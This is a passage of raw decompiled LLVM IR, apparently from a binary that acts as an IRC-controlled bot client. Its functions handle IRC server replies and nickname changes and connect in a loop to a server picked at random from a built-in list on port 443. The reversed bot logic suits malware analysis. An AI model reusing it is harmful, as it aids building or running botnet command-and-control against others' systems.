  %v5_100038b0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_10018874.174 to i32), i32 %arg3, i32 268566528)
  ret i32 %v5_100038b0
}

define i32 @_352(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-80 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100038cc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100038cc, i32* %stack_var_-80, align 4
  br label %dec_label_pc_10003924.preheader

dec_label_pc_1000390c:                            ; preds = %dec_label_pc_1000393c
  %v4_1000393c = ptrtoint i8* %stack_var_-68.057 to i32
  %v1_10003910 = add i32 %v4_1000393c, 1
  %v5_10003914 = inttoptr i32 %v1_10003910 to i8*
  %v1_1000391c = add i32 %stack_var_-60.056, 1
  store i32 %v1_1000391c, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_1000392c = call i32 @__GI_strlen()
  %v0_10003934 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003934 = icmp ult i32 %v0_10003934, %v0_1000392c
  br i1 %v2_10003934, label %dec_label_pc_1000393c, label %dec_label_pc_10003950

dec_label_pc_1000393c:                            ; preds = %dec_label_pc_10003924.preheader, %dec_label_pc_1000390c
  %stack_var_-68.057 = phi i8* [ %v5_10003914, %dec_label_pc_1000390c ], [ %stack_var_-68.163, %dec_label_pc_10003924.preheader ]
  %stack_var_-60.056 = phi i32 [ %v1_1000391c, %dec_label_pc_1000390c ], [ %stack_var_-60.162, %dec_label_pc_10003924.preheader ]
  %v2_10003940 = load i8, i8* %stack_var_-68.057, align 1
  %v3_10003948 = icmp eq i8 %v2_10003940, 32
  br i1 %v3_10003948, label %dec_label_pc_10003950, label %dec_label_pc_1000390c

dec_label_pc_10003950:                            ; preds = %dec_label_pc_1000390c, %dec_label_pc_1000393c, %dec_label_pc_10003924.preheader
  %stack_var_-60.0.lcssa = phi i32 [ %stack_var_-60.162, %dec_label_pc_10003924.preheader ], [ %v1_1000391c, %dec_label_pc_1000390c ], [ %stack_var_-60.056, %dec_label_pc_1000393c ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.163, %dec_label_pc_10003924.preheader ], [ %v5_10003914, %dec_label_pc_1000390c ], [ %stack_var_-68.057, %dec_label_pc_1000393c ]
  %v4_10003950 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_10003954 = add i32 %v4_10003950, 1
  store i32 %stack_var_-60.0.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003964 = call i32 @__GI_strlen()
  %v0_1000396c = load i32, i32* %r29.global-to-local, align 4
  %v4_1000396c = icmp eq i32 %v0_1000396c, %v0_10003964
  br i1 %v4_1000396c, label %dec_label_pc_10003c2c, label %dec_label_pc_10003974

dec_label_pc_10003974:                            ; preds = %dec_label_pc_10003950
  %v5_10003958 = inttoptr i32 %v1_10003954 to i8*
  %v1_10003978 = add nuw nsw i32 %storemerge864, 1
  %tmp91 = icmp slt i32 %v1_10003978, 5
  br i1 %tmp91, label %dec_label_pc_10003924.preheader, label %dec_label_pc_100039a4.preheader

dec_label_pc_10003924.preheader:                  ; preds = %entry, %dec_label_pc_10003974
  %storemerge864 = phi i32 [ 0, %entry ], [ %v1_10003978, %dec_label_pc_10003974 ]
  %stack_var_-68.163 = phi i8* [ %arg3, %entry ], [ %v5_10003958, %dec_label_pc_10003974 ]
  %stack_var_-60.162 = phi i32 [ 0, %entry ], [ %stack_var_-60.0.lcssa, %dec_label_pc_10003974 ]
  store i32 %stack_var_-60.162, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_1000392c51 = call i32 @__GI_strlen()
  %v0_1000393452 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000393453 = icmp ult i32 %v0_1000393452, %v0_1000392c51
  br i1 %v2_1000393453, label %dec_label_pc_1000393c, label %dec_label_pc_10003950

dec_label_pc_100039a4.preheader:                  ; preds = %dec_label_pc_10003974
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003954, i32* @r3, align 4
  %v0_100039ac41 = call i32 @__GI_strlen()
  %v0_100039b442 = load i32, i32* %r29.global-to-local, align 4
  %v2_100039b443 = icmp ult i32 %v0_100039b442, %v0_100039ac41
  br i1 %v2_100039b443, label %dec_label_pc_100039bc, label %dec_label_pc_100039dc

dec_label_pc_10003998:                            ; preds = %dec_label_pc_100039bc
  %v1_1000399c = add i32 %storemerge946, 1
  store i32 %v1_1000399c, i32* %r29.global-to-local, align 4
  store i32 %v1_10003954, i32* @r3, align 4
  %v0_100039ac = call i32 @__GI_strlen()
  %v0_100039b4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100039b4 = icmp ult i32 %v0_100039b4, %v0_100039ac
  br i1 %v2_100039b4, label %dec_label_pc_100039bc, label %dec_label_pc_100039dc

dec_label_pc_100039bc:                            ; preds = %dec_label_pc_100039a4.preheader, %dec_label_pc_10003998
  %storemerge946 = phi i32 [ %v1_1000399c, %dec_label_pc_10003998 ], [ 0, %dec_label_pc_100039a4.preheader ]
  %v2_100039c8 = add i32 %storemerge946, %v1_10003954
  %v1_100039cc = inttoptr i32 %v2_100039c8 to i8*
  %v2_100039cc = load i8, i8* %v1_100039cc, align 1
  %v3_100039d4 = icmp eq i8 %v2_100039cc, 32
  br i1 %v3_100039d4, label %dec_label_pc_100039dc, label %dec_label_pc_10003998

dec_label_pc_100039dc:                            ; preds = %dec_label_pc_10003998, %dec_label_pc_100039bc, %dec_label_pc_100039a4.preheader
  %storemerge9.lcssa = phi i32 [ 0, %dec_label_pc_100039a4.preheader ], [ %v1_1000399c, %dec_label_pc_10003998 ], [ %storemerge946, %dec_label_pc_100039bc ]
  %v2_100039e8 = add i32 %storemerge9.lcssa, %v1_10003954
  %v3_100039f0 = inttoptr i32 %v2_100039e8 to i8*
  store i8 0, i8* %v3_100039f0, align 1
  %v3_100039f8 = load i32, i32* @global_var_1002efd4.157, align 4
  store i32 %v1_10003954, i32* @r3, align 4
  store i32 %v3_100039f8, i32* @r4, align 4
  %v3_10003a04 = call i32 @__GI_strcasecmp(i32 %v1_10003954, i32 %v3_100039f8)
  %v3_10003a0c = icmp eq i32 %v3_10003a04, 0
  br i1 %v3_10003a0c, label %dec_label_pc_10003a14, label %dec_label_pc_10003c2c

dec_label_pc_10003a14:                            ; preds = %dec_label_pc_100039dc
  %v3_10003a18 = load i32, i32* @global_var_1002efc4.28, align 4
  %v3_10003a1c = icmp eq i32 %v3_10003a18, 0
  br i1 %v3_10003a1c, label %dec_label_pc_10003a24, label %dec_label_pc_10003c2c

dec_label_pc_10003a24:                            ; preds = %dec_label_pc_10003a14
  br label %dec_label_pc_10003a58.preheader

dec_label_pc_10003a40:                            ; preds = %dec_label_pc_10003a70
  %v4_10003a70 = ptrtoint i8* %stack_var_-68.233 to i32
  %v1_10003a44 = add i32 %v4_10003a70, 1
  %v5_10003a48 = inttoptr i32 %v1_10003a44 to i8*
  %v1_10003a50 = add i32 %stack_var_-60.232, 1
  store i32 %v1_10003a50, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a60 = call i32 @__GI_strlen()
  %v0_10003a68 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003a68 = icmp ult i32 %v0_10003a68, %v0_10003a60
  br i1 %v2_10003a68, label %dec_label_pc_10003a70, label %dec_label_pc_10003a84

dec_label_pc_10003a70:                            ; preds = %dec_label_pc_10003a58.preheader, %dec_label_pc_10003a40
  %stack_var_-68.233 = phi i8* [ %v5_10003a48, %dec_label_pc_10003a40 ], [ %stack_var_-68.339, %dec_label_pc_10003a58.preheader ]
  %stack_var_-60.232 = phi i32 [ %v1_10003a50, %dec_label_pc_10003a40 ], [ %stack_var_-60.338, %dec_label_pc_10003a58.preheader ]
  %v2_10003a74 = load i8, i8* %stack_var_-68.233, align 1
  %v3_10003a7c = icmp eq i8 %v2_10003a74, 32
  br i1 %v3_10003a7c, label %dec_label_pc_10003a84, label %dec_label_pc_10003a40

dec_label_pc_10003a84:                            ; preds = %dec_label_pc_10003a40, %dec_label_pc_10003a70, %dec_label_pc_10003a58.preheader
  %stack_var_-60.2.lcssa = phi i32 [ %stack_var_-60.338, %dec_label_pc_10003a58.preheader ], [ %v1_10003a50, %dec_label_pc_10003a40 ], [ %stack_var_-60.232, %dec_label_pc_10003a70 ]
  %stack_var_-68.2.lcssa = phi i8* [ %stack_var_-68.339, %dec_label_pc_10003a58.preheader ], [ %v5_10003a48, %dec_label_pc_10003a40 ], [ %stack_var_-68.233, %dec_label_pc_10003a70 ]
  %v4_10003a84 = ptrtoint i8* %stack_var_-68.2.lcssa to i32
  %v1_10003a88 = add i32 %v4_10003a84, 1
  store i32 %stack_var_-60.2.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a98 = call i32 @__GI_strlen()
  %v0_10003aa0 = load i32, i32* %r29.global-to-local, align 4
  %v4_10003aa0 = icmp eq i32 %v0_10003aa0, %v0_10003a98
  br i1 %v4_10003aa0, label %dec_label_pc_10003c2c, label %dec_label_pc_10003aa8

dec_label_pc_10003aa8:                            ; preds = %dec_label_pc_10003a84
  %v5_10003a8c = inttoptr i32 %v1_10003a88 to i8*
  %v1_10003aac = add nuw nsw i32 %storemerge1040, 1
  %tmp92 = icmp slt i32 %v1_10003aac, 3
  br i1 %tmp92, label %dec_label_pc_10003a58.preheader, label %dec_label_pc_10003ad8.preheader

dec_label_pc_10003a58.preheader:                  ; preds = %dec_label_pc_10003a24, %dec_label_pc_10003aa8
  %storemerge1040 = phi i32 [ 0, %dec_label_pc_10003a24 ], [ %v1_10003aac, %dec_label_pc_10003aa8 ]
  %stack_var_-68.339 = phi i8* [ %arg3, %dec_label_pc_10003a24 ], [ %v5_10003a8c, %dec_label_pc_10003aa8 ]
  %stack_var_-60.338 = phi i32 [ 0, %dec_label_pc_10003a24 ], [ %stack_var_-60.2.lcssa, %dec_label_pc_10003aa8 ]
  store i32 %stack_var_-60.338, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a6027 = call i32 @__GI_strlen()
  %v0_10003a6828 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003a6829 = icmp ult i32 %v0_10003a6828, %v0_10003a6027
  br i1 %v2_10003a6829, label %dec_label_pc_10003a70, label %dec_label_pc_10003a84

dec_label_pc_10003ad8.preheader:                  ; preds = %dec_label_pc_10003aa8
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003a88, i32* @r3, align 4
  %v0_10003ae018 = call i32 @__GI_strlen()
  %v0_10003ae819 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003ae820 = icmp ult i32 %v0_10003ae819, %v0_10003ae018
  br i1 %v2_10003ae820, label %dec_label_pc_10003af0, label %dec_label_pc_10003b10

dec_label_pc_10003acc:                            ; preds = %dec_label_pc_10003af0
  %v1_10003ad0 = add i32 %storemerge1123, 1
  store i32 %v1_10003ad0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003a88, i32* @r3, align 4
  %v0_10003ae0 = call i32 @__GI_strlen()
  %v0_10003ae8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003ae8 = icmp ult i32 %v0_10003ae8, %v0_10003ae0
  br i1 %v2_10003ae8, label %dec_label_pc_10003af0, label %dec_label_pc_10003b10

dec_label_pc_10003af0:                            ; preds = %dec_label_pc_10003ad8.preheader, %dec_label_pc_10003acc
  %storemerge1123 = phi i32 [ %v1_10003ad0, %dec_label_pc_10003acc ], [ 0, %dec_label_pc_10003ad8.preheader ]
  %v2_10003afc = add i32 %storemerge1123, %v1_10003a88
  %v1_10003b00 = inttoptr i32 %v2_10003afc to i8*
  %v2_10003b00 = load i8, i8* %v1_10003b00, align 1
  %v3_10003b08 = icmp eq i8 %v2_10003b00, 32
  br i1 %v3_10003b08, label %dec_label_pc_10003b10, label %dec_label_pc_10003acc

dec_label_pc_10003b10:                            ; preds = %dec_label_pc_10003acc, %dec_label_pc_10003af0, %dec_label_pc_10003ad8.preheader
  %storemerge11.lcssa = phi i32 [ 0, %dec_label_pc_10003ad8.preheader ], [ %v1_10003ad0, %dec_label_pc_10003acc ], [ %storemerge1123, %dec_label_pc_10003af0 ]
  %v2_10003b1c = add i32 %storemerge11.lcssa, %v1_10003a88
  %v3_10003b24 = inttoptr i32 %v2_10003b1c to i8*
  store i8 0, i8* %v3_10003b24, align 1
  store i32 268450608, i32* @lr, align 4
  %v2_10003b2c = call i32 @inet_addr(i32 %v1_10003a88)
  %v5_10003b34 = trunc i32 %v2_10003b2c to i8
  store i8 %v5_10003b34, i8* %stack_var_-56, align 1
  %v4_10003b40 = icmp eq i8 %v5_10003b34, -1
  br i1 %v4_10003b40, label %dec_label_pc_10003b48, label %dec_label_pc_10003bb4

dec_label_pc_10003b48:                            ; preds = %dec_label_pc_10003b10
  store i32 268450640, i32* @lr, align 4
  %v3_10003b4c = call i32 @__GI_gethostbyname(i32 %v1_10003a88, i32 %v2_10003b2c)
  %v3_10003b5c = icmp eq i32 %v3_10003b4c, 0
  br i1 %v3_10003b5c, label %dec_label_pc_10003b64, label %dec_label_pc_10003b88

dec_label_pc_10003b64:                            ; preds = %dec_label_pc_10003b48
  %v3_10003b68 = load i32, i32* @global_var_1002efe8.155, align 4
  %v5_10003b80 = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_10018880.175 to i32), i32 %v3_10003b68, i32 268566528)
  br label %dec_label_pc_10003c2c

dec_label_pc_10003b88:                            ; preds = %dec_label_pc_10003b48
  %v2_10003b88 = ptrtoint i8* %stack_var_-56 to i32
  %v1_10003b90 = add i32 %v3_10003b4c, 16
  %v2_10003b90 = inttoptr i32 %v1_10003b90 to i32*
  %v3_10003b90 = load i32, i32* %v2_10003b90, align 4
  %v1_10003b94 = inttoptr i32 %v3_10003b90 to i32*
  %v2_10003b94 = load i32, i32* %v1_10003b94, align 4
  %v1_10003b9c = add i32 %v3_10003b4c, 12
  %v2_10003b9c = inttoptr i32 %v1_10003b9c to i32*
  %v3_10003b9c = load i32, i32* %v2_10003b9c, align 4
  store i32 %v2_10003b88, i32* @r3, align 4
  store i32 %v2_10003b94, i32* @r4, align 4
  store i32 %v3_10003b9c, i32* @r5, align 4
  store i32 268450740, i32* @lr, align 4
  %v0_10003bb0 = call i32 @memcpy()
  %v2_10003bc4.pre = load i8, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10003bb4

dec_label_pc_10003bb4:                            ; preds = %dec_label_pc_10003b10, %dec_label_pc_10003b88
  %v0_10003c4475 = phi i32 [ %v0_10003bb0, %dec_label_pc_10003b88 ], [ %v2_10003b2c, %dec_label_pc_10003b10 ]
  %v2_10003bc4 = phi i8 [ %v2_10003bc4.pre, %dec_label_pc_10003b88 ], [ %v5_10003b34, %dec_label_pc_10003b10 ]
  store i8 %v2_10003bc4, i8* bitcast (i8** @global_var_1002efc3.177 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_1002efc0.27 to i8*), align 4
  store i32 256, i32* @global_var_1002efc4.28, align 4
  br label %dec_label_pc_10003c2c

dec_label_pc_10003c2c:                            ; preds = %dec_label_pc_10003950, %dec_label_pc_10003a84, %dec_label_pc_10003a14, %dec_label_pc_100039dc, %dec_label_pc_10003b64, %dec_label_pc_10003bb4
  %v0_10003c44 = phi i32 [ 0, %dec_label_pc_10003a14 ], [ %v3_10003a04, %dec_label_pc_100039dc ], [ %v5_10003b80, %dec_label_pc_10003b64 ], [ %v0_10003c4475, %dec_label_pc_10003bb4 ], [ %v0_10003a98, %dec_label_pc_10003a84 ], [ %v0_10003964, %dec_label_pc_10003950 ]
  %v2_10003c2c = load i32, i32* %stack_var_-80, align 4
  %v1_10003c38 = add i32 %v2_10003c2c, -12
  %v2_10003c38 = inttoptr i32 %v1_10003c38 to i32*
  %v3_10003c38 = load i32, i32* %v2_10003c38, align 4
  store i32 %v3_10003c38, i32* %r29.global-to-local, align 4
  ret i32 %v0_10003c44

; uselistorder directives
  uselistorder i32 %v2_10003b2c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.338, { 2, 0, 1 }
  uselistorder i32 %v1_10003aac, { 1, 0 }
  uselistorder i32 %v1_10003a88, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %stack_var_-60.162, { 2, 0, 1 }
  uselistorder i32 %v1_10003978, { 1, 0 }
  uselistorder i32 %v1_10003954, { 3, 2, 0, 1, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 6, 7, 8, 19, 20, 0, 1, 9, 10, 11, 12, 13, 14, 2, 3, 4, 5, 15, 16, 17, 18 }
  uselistorder i8** @global_var_1002efc0.27, { 0, 4, 3, 2, 1 }
  uselistorder i32* @global_var_1002efc4.28, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i8* %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003c2c, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10003bb4, { 1, 0 }
  uselistorder label %dec_label_pc_10003b10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003af0, { 1, 0 }
  uselistorder label %dec_label_pc_10003a58.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10003a84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100039dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100039bc, { 1, 0 }
  uselistorder label %dec_label_pc_10003924.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10003950, { 2, 1, 0 }
}

define i32 @_433(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_10003c6c = load i32, i32* @global_var_1002efd4.157, align 4
  store i32 %v3_10003c6c, i32* @r3, align 4
  store i32 268450936, i32* @lr, align 4
  %v0_10003c74 = call i32 @free()
  store i32 268450940, i32* @lr, align 4
  %v0_10003c78 = call i32 @makestring()
  store i32 %v0_10003c78, i32* @global_var_1002efd4.157, align 4
  ret i32 %v0_10003c78
}

define i32 @_NICK(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 %arg2, i32* @r3, align 4
  %v0_10003ce42 = call i32 @__GI_strlen()
  %v2_10003cec4 = icmp eq i32 %v0_10003ce42, 0
  br i1 %v2_10003cec4, label %dec_label_pc_10003d14, label %dec_label_pc_10003cf4

dec_label_pc_10003cd0:                            ; preds = %dec_label_pc_10003cf4
  %v1_10003cd4 = add i32 %storemerge17, 1
  store i32 %arg2, i32* @r3, align 4
  %v0_10003ce4 = call i32 @__GI_strlen()
  %v2_10003cec = icmp ult i32 %v1_10003cd4, %v0_10003ce4
  br i1 %v2_10003cec, label %dec_label_pc_10003cf4, label %dec_label_pc_10003d14

dec_label_pc_10003cf4:                            ; preds = %entry, %dec_label_pc_10003cd0
  %storemerge17 = phi i32 [ %v1_10003cd4, %dec_label_pc_10003cd0 ], [ 0, %entry ]
  %v2_10003d00 = add i32 %storemerge17, %arg2
  %v1_10003d04 = inttoptr i32 %v2_10003d00 to i8*
  %v2_10003d04 = load i8, i8* %v1_10003d04, align 1
  %v3_10003d0c = icmp eq i8 %v2_10003d04, 33
  br i1 %v3_10003d0c, label %dec_label_pc_10003d14, label %dec_label_pc_10003cd0

dec_label_pc_10003d14:                            ; preds = %entry, %dec_label_pc_10003cd0, %dec_label_pc_10003cf4
  %storemerge1.lcssa = phi i32 [ 0, %entry ], [ %v1_10003cd4, %dec_label_pc_10003cd0 ], [ %storemerge17, %dec_label_pc_10003cf4 ]
  %v2_10003d20 = add i32 %storemerge1.lcssa, %arg2
  %v3_10003d28 = inttoptr i32 %v2_10003d20 to i8*
  store i8 0, i8* %v3_10003d28, align 1
  %v3_10003d30 = load i32, i32* @global_var_1002efd4.157, align 4
  store i32 %arg2, i32* @r3, align 4
  store i32 %v3_10003d30, i32* @r4, align 4
  %v2_10003d3c = call i32 @__GI_strcasecmp(i32 %arg2, i32 %v3_10003d30)
  %v3_10003d44 = icmp eq i32 %v2_10003d3c, 0
  br i1 %v3_10003d44, label %dec_label_pc_10003d4c, label %dec_label_pc_10003da0

dec_label_pc_10003d4c:                            ; preds = %dec_label_pc_10003d14
  %v2_10003d50 = load i8, i8* %arg3, align 1
  %v3_10003d58 = icmp eq i8 %v2_10003d50, 58
  br i1 %v3_10003d58, label %dec_label_pc_10003d60, label %dec_label_pc_10003d6c

dec_label_pc_10003d60:                            ; preds = %dec_label_pc_10003d4c
  %v1_10003d64 = add i32 %tmp, 1
  %v5_10003d68 = inttoptr i32 %v1_10003d64 to i8*
  br label %dec_label_pc_10003d6c

dec_label_pc_10003d6c:                            ; preds = %dec_label_pc_10003d4c, %dec_label_pc_10003d60
  %stack_var_-32.0 = phi i8* [ %v5_10003d68, %dec_label_pc_10003d60 ], [ %arg3, %dec_label_pc_10003d4c ]
  %v3_10003d70 = load i32, i32* @global_var_1002efd4.157, align 4
  %v3_10003d74 = icmp eq i32 %v3_10003d70, 0
  br i1 %v3_10003d74, label %dec_label_pc_10003d8c, label %dec_label_pc_10003d7c

dec_label_pc_10003d7c:                            ; preds = %dec_label_pc_10003d6c
  store i32 %v3_10003d70, i32* @r3, align 4
  store i32 268451212, i32* @lr, align 4
  %v0_10003d88 = call i32 @free()
  br label %dec_label_pc_10003d8c

dec_label_pc_10003d8c:                            ; preds = %dec_label_pc_10003d6c, %dec_label_pc_10003d7c
  %v4_10003d8c = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 268451220, i32* @lr, align 4
  %v2_10003d90 = call i32 @__GI_strdup(i32 %v4_10003d8c)
  store i32 %v2_10003d90, i32* @global_var_1002efd4.157, align 4
  br label %dec_label_pc_10003da0

dec_label_pc_10003da0:                            ; preds = %dec_label_pc_10003d14, %dec_label_pc_10003d8c
  %v0_10003db8 = phi i32 [ %v2_10003d3c, %dec_label_pc_10003d14 ], [ %v2_10003d90, %dec_label_pc_10003d8c ]
  ret i32 %v0_10003db8

; uselistorder directives
  uselistorder i32 %v1_10003cd4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_10003da0, { 1, 0 }
  uselistorder label %dec_label_pc_10003d8c, { 1, 0 }
  uselistorder label %dec_label_pc_10003d6c, { 1, 0 }
  uselistorder label %dec_label_pc_10003d14, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003cf4, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v2_10003ef4 = ptrtoint i32* %stack_var_-28 to i32
  %v2_10003ef8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_10003f50 = ptrtoint i32* %stack_var_-12 to i32
  br label %dec_label_pc_10003dd4

dec_label_pc_10003dd4:                            ; preds = %dec_label_pc_10003dd4.backedge, %entry
  store i32 -1, i32* @global_var_1002efd8.22, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_10003dec = load i32, i32* @global_var_1002efb8.119, align 4
  %v3_10003df0 = icmp eq i32 %v3_10003dec, 0
  br i1 %v3_10003df0, label %dec_label_pc_10003df8, label %dec_label_pc_10003e30

dec_label_pc_10003df8:                            ; preds = %dec_label_pc_10003dd4
  store i32 268451324, i32* @lr, align 4
  %v0_10003df8 = call i32 @random()
  %v3_10003e04 = load i32, i32* @global_var_1002ef20.180, align 4
  %v2_10003e08 = srem i32 %v0_10003df8, %v3_10003e04
  %v1_10003e1c = mul i32 %v2_10003e08, 4
  %v2_10003e20 = add i32 %v1_10003e1c, ptrtoint ([15 x i8]** @global_var_1002ef24.182 to i32)
  %v1_10003e24 = inttoptr i32 %v2_10003e20 to i32*
  %v2_10003e24 = load i32, i32* %v1_10003e24, align 4
  store i32 %v2_10003e24, i32* @global_var_1002efe0.118, align 4
  br label %dec_label_pc_10003e30

dec_label_pc_10003e30:                            ; preds = %dec_label_pc_10003dd4, %dec_label_pc_10003df8
  store i32 0, i32* @global_var_1002efb8.119, align 4
  br label %dec_label_pc_10003e3c

dec_label_pc_10003e3c:                            ; preds = %dec_label_pc_10003e3c, %dec_label_pc_10003e30
  store i32 268451404, i32* @lr, align 4
  %v3_10003e48 = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %v3_10003e48, i32* @global_var_1002efd8.22, align 4
  %v1_10003e60 = icmp slt i32 %v3_10003e48, 0
  br i1 %v1_10003e60, label %dec_label_pc_10003e3c, label %dec_label_pc_10003e68

dec_label_pc_10003e68:                            ; preds = %dec_label_pc_10003e3c
  %v3_10003e6c = load i32, i32* @global_var_1002efe0.118, align 4
  store i32 268451448, i32* @lr, align 4
  %v1_10003e74 = call i32 @inet_addr(i32 %v3_10003e6c)
  %v3_10003e7c = icmp eq i32 %v1_10003e74, 0
  br i1 %v3_10003e7c, label %dec_label_pc_10003ea4, label %dec_label_pc_10003e84

dec_label_pc_10003e84:                            ; preds = %dec_label_pc_10003e68
  %v3_10003e88 = load i32, i32* @global_var_1002efe0.118, align 4
  store i32 268451476, i32* @lr, align 4
  %v1_10003e90 = call i32 @inet_addr(i32 %v3_10003e88)
  %v4_10003e9c = icmp eq i32 %v1_10003e90, -1
  br i1 %v4_10003e9c, label %dec_label_pc_10003ea4, label %dec_label_pc_10003f18

dec_label_pc_10003ea4:                            ; preds = %dec_label_pc_10003e84, %dec_label_pc_10003e68
  %v3_10003ea8 = load i32, i32* @global_var_1002efe0.118, align 4
  store i32 268451508, i32* @lr, align 4
  %v2_10003eb0 = call i32 @__GI_gethostbyname(i32 %v3_10003ea8, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  %v3_10003ec0 = icmp eq i32 %v2_10003eb0, 0
  br i1 %v3_10003ec0, label %dec_label_pc_10003ec8, label %dec_label_pc_10003ee8

dec_label_pc_10003ec8:                            ; preds = %dec_label_pc_10003ea4
  store i32 0, i32* @global_var_1002efe0.118, align 4
  %v3_10003ed8 = load i32, i32* @global_var_1002efd8.22, align 4
  store i32 268451556, i32* @lr, align 4
  %v1_10003ee0 = call i32 @close(i32 %v3_10003ed8)
  br label %dec_label_pc_10003dd4.backedge

dec_label_pc_10003dd4.backedge:                   ; preds = %dec_label_pc_10003ec8, %dec_label_pc_10004080
  br label %dec_label_pc_10003dd4

dec_label_pc_10003ee8:                            ; preds = %dec_label_pc_10003ea4
  %v1_10003eec = add i32 %v2_10003eb0, 16
  %v2_10003eec = inttoptr i32 %v1_10003eec to i32*
  %v3_10003eec = load i32, i32* %v2_10003eec, align 4
  %v1_10003ef0 = inttoptr i32 %v3_10003eec to i32*
  %v2_10003ef0 = load i32, i32* %v1_10003ef0, align 4
  %v1_10003f00 = add i32 %v2_10003eb0, 12
  %v2_10003f00 = inttoptr i32 %v1_10003f00 to i32*
  %v3_10003f00 = load i32, i32* %v2_10003f00, align 4
  store i32 %v3_10003f00, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10003f14.183 to i32), i32* @lr, align 4
  %v4_10003f10 = call i32 @bcopy(i32 %v2_10003ef0, i32 %v2_10003ef8, i32 %v3_10003f00, i32 %v2_10003eb0)
  br label %dec_label_pc_10003f30

dec_label_pc_10003f18:                            ; preds = %dec_label_pc_10003e84
  %v3_10003f1c = load i32, i32* @global_var_1002efe0.118, align 4
  store i32 268451624, i32* @lr, align 4
  %v1_10003f24 = call i32 @inet_addr(i32 %v3_10003f1c)
  store i32 %v1_10003f24, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10003f30

dec_label_pc_10003f30:                            ; preds = %dec_label_pc_10003ee8, %dec_label_pc_10003f18
  store i32 2, i32* %stack_var_-28, align 4
  store i32 443, i32* @r3, align 4
  %v1_10003f3c = call i32 @htons(i32 443)
  %v3_10003f4c = load i32, i32* @global_var_1002efd8.22, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10003f6c.184 to i32), i32* @lr, align 4
  %v3_10003f68 = call i32 @ioctl(i32 %v3_10003f4c, i32 -2147195266, i32 %v2_10003f50)
  store i32 268451700, i32* @lr, align 4
  %v1_10003f70 = call i32 @__GI_time(i32 0)
  store i32 268451944, i32* @lr, align 4
  %v1_1000406411 = call i32 @__GI_time(i32 0)
  %v2_1000407412 = sub i32 %v1_1000406411, %v1_10003f70
  %tmp1016 = icmp ult i32 %v2_1000407412, 10
  br i1 %tmp1016, label %dec_label_pc_10003f80, label %dec_label_pc_10004080

dec_label_pc_10003f80:                            ; preds = %dec_label_pc_10003f30, %dec_label_pc_10004058
  %v0_10003f80 = call i32 @__errno_location()
  %v2_10003f8c = inttoptr i32 %v0_10003f80 to i32*
  store i32 0, i32* %v2_10003f8c, align 4
  %v3_10003f94 = load i32, i32* @global_var_1002efd8.22, align 4
  store i32 268451756, i32* @lr, align 4
  %v4_10003fa8 = call i32 @connect(i32 %v3_10003f94, i32 %v2_10003ef4, i32 16, i32 %v2_10003ef4)
  %v3_10003fb0 = icmp eq i32 %v4_10003fa8, 0
  br i1 %v3_10003fb0, label %dec_label_pc_10003fcc, label %dec_label_pc_10003fb8

dec_label_pc_10003fb8:                            ; preds = %dec_label_pc_10003f80
  %v0_10003fb8 = call i32 @__errno_location()
  %v1_10003fc0 = inttoptr i32 %v0_10003fb8 to i32*
  %v2_10003fc0 = load i32, i32* %v1_10003fc0, align 4
